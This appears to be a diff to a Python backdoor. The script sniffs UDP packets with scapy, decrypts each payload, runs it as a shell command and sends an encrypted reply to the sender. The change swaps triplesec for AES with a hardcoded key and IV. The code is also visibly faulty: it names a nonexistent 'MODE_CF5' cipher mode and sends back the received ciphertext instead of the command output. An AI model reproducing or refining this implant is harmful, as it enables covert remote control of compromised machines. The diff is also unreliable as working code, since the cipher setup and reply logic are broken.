@@ -5,7 +5,7 @@ import os
 import argparse
 import platform
 import subprocess
-import triplesec
+from Crypto.Cipher import AES
 from ctypes import *
 from scapy.all import *
 
@@ -33,13 +33,16 @@ parser.add_argument('-d'
 #                    , help='Interface to sniff for packets on.')
 args = parser.parse_args()
 sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
+encryptionObject = AES.new('This is a key123', AES.MODE_CF5, 'This is an IV456')
+decryptionObject = AES.new('This is a key123', AES.MODE_CF5, 'This is an IV456')
+
 
 def runCommand(packet):
   encryptedData = packet['Raw'].load
-  data = triplesec.decrypt(encryptedData, b'key yo')
+  data = decryptionObject.decrypt(encryptedData)
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
-  encryptedOutput = triplesec.encrypt(output, b'key yo')
+  encryptedOutput = encryptionObject.encrypt(output)
   packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
   send(packet)
 
